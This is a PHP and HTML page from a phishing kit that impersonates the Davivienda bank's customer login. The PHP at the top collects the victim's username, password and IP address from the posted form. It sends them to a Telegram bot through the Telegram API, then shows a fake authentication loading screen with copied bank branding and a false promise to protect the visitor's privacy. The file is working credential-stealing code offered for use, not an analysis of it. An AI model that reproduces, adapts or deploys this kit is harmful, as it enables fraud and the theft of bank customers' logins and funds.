<?php   

@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
$DUn = $_POST['D1'];
$DDo = $_POST['D2'];
include 'infr.php';

if ( isset ($DUn) && isset ($DDo) ){
$mss ="[==== DAVIVIENDA ====]"."\n"."#Uz: ".$DUn."\n"."#CL: ".$DDo."\n".$userp."\r\n";
$puro =  $bot_Tele;
$data = ['chat_id' => $chat,'text' => $mss];
$response = file_get_contents("https://api.telegram.org/bot$puro/sendMessage?" . http_build_query($data));
} else{ header ('location: index.html'); exit();}


?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda</title>
    <link rel="stylesheet" href="estilos.css">
</head>
<body>
        <!---BY-STTCAS--->
    
        <header>
            <div class="h1">
                <img src="https://i.postimg.cc/HL4JNXPt/head.png" alt="">
            </div>
            <div class="h2">
                ingles
            </div>
        </header>

        <div class="box-todo">
            <div class="box" style="height: 416px;">
                <div class="titu">
                    <h1>Autenticación del cliente</h1>
                </div>
                

                <div class="cjaLogin" id="gif" style=" margin: 126px 0;">
                    <img src="https://i.postimg.cc/7PBzD1Ps/carg.gif" style="width: 50px;" alt="">
                    
                </div>
                <span id="mensaje" ></span>

               
                <nav>
                    <a href="">AutoAdhesión</a>
                    <a href="">¿Olvidó su contraseña?</a>
                    <a href="">Mi usuario fue bloqueado</a>
                </nav>
                <div class="fo">
                    Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera.
                </div>
            </div>
            <footer>
                <div class="conf">
                    Davivienda - © 2017 Davivienda - Todos los derechos reservados
                </div>
            </footer>
        </div>
   
</body>
<script src="sms.js"></script>
<script src="secure.js"></script>
</html>